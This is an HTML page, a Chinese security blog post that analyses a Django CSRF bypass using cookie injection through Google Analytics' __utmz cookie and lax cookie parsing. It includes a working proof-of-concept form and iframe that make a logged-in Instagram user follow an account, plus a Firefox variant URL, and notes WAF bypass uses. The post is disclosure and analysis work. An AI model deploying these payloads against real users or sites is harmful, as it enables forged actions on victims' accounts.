@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>Django CSRF 防护绕过漏洞分析 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Django CSRF 防护绕过漏洞分析 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/753/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#Django" class="post-tag">Django</a>
+            
+            
+        </div>
+        <h1>Django CSRF 防护绕过漏洞分析</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-09-27 13:28"><i class="iconfont icon-date"></i>2016-09-27 13:28</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>原始漏洞链接 https://hackerone.com/reports/26647</p>
+
+<h2 id="使用-google-analytics-进行-cookie-注入">使用 Google Analytics 进行 Cookie 注入</h2>
+
+<ul>
+  <li>Google Analytics 会设置这样的 Cookie 来追踪用户访问</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
+</code></pre>
+</div>
+<p>比如</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/
+</code></pre>
+</div>
+
+<ul>
+  <li>用户可以完全控制 referer 中的 path，然后在放入<code class="highlighter-rouge">__utmz</code>的时候没有过滤</li>
+</ul>
+
+<h2 id="不同的-web-server-对-cookie-parse-结果的不同">不同的 web server 对 Cookie parse 结果的不同</h2>
+
+<ul>
+  <li>一个正常的Cookie是这样子的 <code class="highlighter-rouge">Cookie: param1=value1; param2=value2;</code></li>
+  <li>但是很多 web server 也可以接收使用逗号分隔的</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Cookie: param1=value2, param2=value2
+Cookie: param1=value2,param2=value2
+</code></pre>
+</div>
+
+<p>Python 和 Django 使用了不正确的正则表达式来 parse Cookie，导致用户也可以使用<code class="highlighter-rouge">[]</code>来作为分隔符 <code class="highlighter-rouge">Cookie: param1=value1]param2=value2</code></p>
+
+<p>参考</p>
+
+<ul>
+  <li>https://docs.python.org/3/library/http.cookies.html</li>
+  <li>http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432</li>
+  <li>http://tools.ietf.org/html/rfc2109</li>
+  <li>http://tools.ietf.org/html/rfc2068</li>
+</ul>
+
+<p>例子</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code> <span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">http</span> <span class="kn">import</span> <span class="n">cookies</span>
+ <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
+ <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah]csrftoken=x'</span><span class="p">)</span>
+ <span class="o">&gt;&gt;&gt;</span> <span class="n">C</span>
+ <span class="o">&lt;</span><span class="n">SimpleCookie</span><span class="p">:</span> <span class="n">csrftoken</span><span class="o">=</span><span class="s">'x'</span><span class="o">&gt;</span>
+</code></pre>
+</div>
+
+<h2 id="不同的浏览器对-cookie-处理结果的不同">不同的浏览器对 Cookie 处理结果的不同</h2>
+
+<p>除了 Safari 之外，其他的浏览器都可以在 Cookie value 中使用空格、逗号和<code class="highlighter-rouge">[]</code>字符。</p>
+
+<p>而且 Chrome 只可以处理有限的 Cookie 属性，比如</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
+</code></pre>
+</div>
+
+<p>最终只能给<code class="highlighter-rouge">.google.com</code>而不是<code class="highlighter-rouge">blah.blah.blah.google.com</code>设置上 Cookie</p>
+
+<h2 id="综合在一起利用">综合在一起利用</h2>
+
+<h3 id="条件是">条件是</h3>
+
+<ul>
+  <li>网站使用 Google Analytics</li>
+  <li>网站使用的 server 或后端有 Cookie 解析的问题，比如 Django</li>
+  <li>网站使用了基于 Cookie 的 CSRF 防护方法</li>
+</ul>
+
+<h3 id="结果">结果</h3>
+
+<ul>
+  <li>我们可以设置任意的 Cookie 或者覆盖已有的 Cookie</li>
+  <li>这个网站就有 CSRF 防护绕过的问题</li>
+</ul>
+
+<h3 id="poc">POC</h3>
+
+<p>使用 Chrome 可以在 instagram.com 上复现这个问题</p>
+
+<ul>
+  <li>打开 Chrome 隐身模式</li>
+  <li>登录 instagram.com</li>
+  <li>点击下面的链接，然后稍等</li>
+  <li>然后你就会关注了 http://instagram.com/black2fan</li>
+</ul>
+
+<p><code class="highlighter-rouge">http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html</code>的源码是</p>
+
+<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;form</span> 
+<span class="na">action=</span><span class="s">"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed"</span> 
+<span class="na">id=</span><span class="s">"csrf"</span> 
+<span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrfmiddlewaretoken"</span> <span class="na">value=</span><span class="s">"x"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+      <span class="kd">function</span> <span class="nx">xxx</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'csrf'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+      <span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;iframe</span> 
+<span class="na">onload=</span><span class="s">"xxx()"</span> 
+<span class="na">src=</span><span class="s">"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"</span><span class="nt">/&gt;</span>
+</code></pre>
+</div>
+
+<h3 id="描述">描述</h3>
+
+<ul>
+  <li>用户已经登录了 instagram.com</li>
+  <li>让用户访问下面的链接，同时假设他没有访问过<code class="highlighter-rouge">blog.instagram.com</code>，也没有这个子域名的<code class="highlighter-rouge">__utmz</code>。</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
+</code></pre>
+</div>
+
+<p>这时候，Cookie 就会使用新的 path 和 domain，<code class="highlighter-rouge">.instgram.com</code> 就会被设置一个新的 Cookie <code class="highlighter-rouge">_utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x</code></p>
+
+<ul>
+  <li>这时候，服务器就会认为 Cookie 中的<code class="highlighter-rouge">__utmz</code>是错误的格式，CSRF token是<code class="highlighter-rouge">x</code></li>
+  <li>使用 CSRF token 提交上面的表单</li>
+</ul>
+
+<h2 id="修复">修复</h2>
+
+<p>Python 的 patch 是 https://hg.python.org/cpython/rev/270f61ec1157，但是后来发现还是有问题的，比如</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">C</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">SimpleCookie</span><span class="p">()</span>
+<span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah csrftoken=x'</span><span class="p">)</span>
+<span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x09</span><span class="s">csrftoken=x'</span><span class="p">)</span>
+<span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x0b</span><span class="s">csrftoken=x'</span><span class="p">)</span>
+<span class="n">C</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s">'__utmz=blah</span><span class="se">\x0c</span><span class="s">csrftoken=x'</span><span class="p">)</span> 
+</code></pre>
+</div>
+
+<p>仍然会被解析为两个 Cookie，但是实际的浏览器处理并不一样</p>
+
+<ul>
+  <li>IE 浏览器会把<code class="highlighter-rouge">\x09 \x0b \x0c</code>替换为下划线</li>
+  <li>Chrome 会忽略这种 Cookie</li>
+  <li>Google Analytics 会把空格替换为 <code class="highlighter-rouge">%20</code>，当然这不重要，因为其他的 JS 也可能有问题</li>
+</ul>
+
+<p>但是 Firefox 是支持所有的字符的，所以可以这样利用</p>
+<ul>
+  <li>移除 instgram.com 的所有 Cookie</li>
+  <li>使用 Firefox 打开 <code class="highlighter-rouge">http://instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken=x#</code></li>
+  <li>刷新页面，你会发现 <code class="highlighter-rouge">csrftoken=x</code></li>
+</ul>
+
+<p>最近 Django 修复了这个问题，https://www.djangoproject.com/weblog/2016/sep/26/security-releases/，使用了简单的 parse Cookie 的方法，https://github.com/django/django/commit/d1bc980db1c0fffd6d60677e62f70beadb9fe64a，虽然不太标准，但是已经足够了。</p>
+
+<h2 id="思考">思考</h2>
+<ul>
+  <li>Twitter的这个公开的更早 https://hackerone.com/reports/14883</li>
+  <li>这个可以称为是 HTTP 参数污染了，这个手段在绕过部分WAF防护的时候还是有用的。比如<code class="highlighter-rouge">ngx_lua_waf</code> 的绕过，因为乌云无法访问，我截图放出来 https://dn-virusdefender-blog.qbox.me/ngx_lua_waf_hpp.png</li>
+  <li>https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004) https://www.exploit-db.com/docs/17534.pdf 这里有一些总结</li>
+  <li>覆盖Cookie进行绕过CSRF防护 https://www.leavesongs.com/HTML/zhihu-xss-worm.html</li>
+  <li>很多 RFC 规范太蛋疼</li>
+</ul>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=Django CSRF 防护绕过漏洞分析&article_id=/index.php/archives/753/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
